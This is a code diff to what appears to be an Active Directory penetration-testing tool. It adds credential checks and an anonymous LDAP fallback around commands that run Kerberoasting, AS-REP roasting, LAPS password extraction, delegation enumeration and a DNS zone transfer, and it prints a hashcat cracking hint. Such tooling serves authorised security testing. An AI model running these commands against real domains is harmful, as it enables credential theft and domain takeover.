@@ -33,12 +33,18 @@ def run():
     base_dn = "DC=" + dom.replace(".", ",DC=")
     nxc_a   = nxc_auth(user, pw, SESSION.get("nt_hash", ""), dom, dc)
     cme     = f"nxc smb {shell_quote(dc)} {nxc_a}"
+    has_auth = bool(user and (pw or SESSION.get("nt_hash") or SESSION.get("use_kerberos")))
     if SESSION.get("use_kerberos"):
         ldap_b = f"ldapsearch -Y GSSAPI -H ldap://{shell_quote(dc)} -b {shell_quote(base_dn)}"
-    else:
+    elif has_auth:
         ldap_b = (
             f"ldapsearch -x -H ldaps://{shell_quote(dc)}:636 "
             f"-D {shell_quote(user + '@' + dom)} -w {shell_quote(pw)} -b {shell_quote(base_dn)}"
+        )
+    else:
+        ldap_b = (
+            f"ldapsearch -x -H ldap://{shell_quote(dc)} "
+            f"-b {shell_quote(base_dn)}"
         )
     imp_auth = get_auth_string()
     # imp() available via: from utils.helpers import *
@@ -73,10 +79,13 @@ def run():
         run_cmd(f"{cme} --pass-pol")
 
     if c in ("6","A"):
-        stop = spinner("Finding Kerberoastable users")
-        run_cmd(f"{imp('GetUserSPNs.py')} {imp_auth} -dc-ip {shell_quote(dc)} -request -outputfile /tmp/kerberoast.txt")
-        stop()
-        info("Crack: hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt")
+        if has_auth:
+            stop = spinner("Finding Kerberoastable users")
+            run_cmd(f"{imp('GetUserSPNs.py')} {imp_auth} -dc-ip {shell_quote(dc)} -request -outputfile /tmp/kerberoast.txt")
+            stop()
+            info("Crack: hashcat -m 13100 /tmp/kerberoast.txt /usr/share/wordlists/rockyou.txt")
+        else:
+            warn("Skipping Kerberoast SPN collection: credentials are required.")
 
     if c in ("7","A"):
         run_cmd(f"{imp('GetNPUsers.py')} {dom}/ -dc-ip {dc} -no-pass -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep.txt")
@@ -86,13 +95,19 @@ def run():
         run_cmd(f"{ldap_b} '(&(objectClass=user)(adminCount=1))' sAMAccountName memberOf")
 
     if c in ("9","A"):
-        run_cmd(f"{ldap_b} '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime cn")
+        if has_auth:
+            run_cmd(f"{ldap_b} '(ms-Mcs-AdmPwd=*)' ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime cn")
+        else:
+            warn("Skipping LAPS query: credentials are required.")
 
     if c in ("10","A"):
         run_cmd(f"{ldap_b} '(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' cn dNSHostName")
 
     if c in ("11","A"):
-        run_cmd(f"{imp('findDelegation.py')} {imp_auth} -dc-ip {shell_quote(dc)}")
+        if has_auth:
+            run_cmd(f"{imp('findDelegation.py')} {imp_auth} -dc-ip {shell_quote(dc)}")
+        else:
+            warn("Skipping constrained delegation query: credentials are required.")
 
     if c in ("12","A"):
         run_cmd(f"dig axfr @{dc} {dom}")
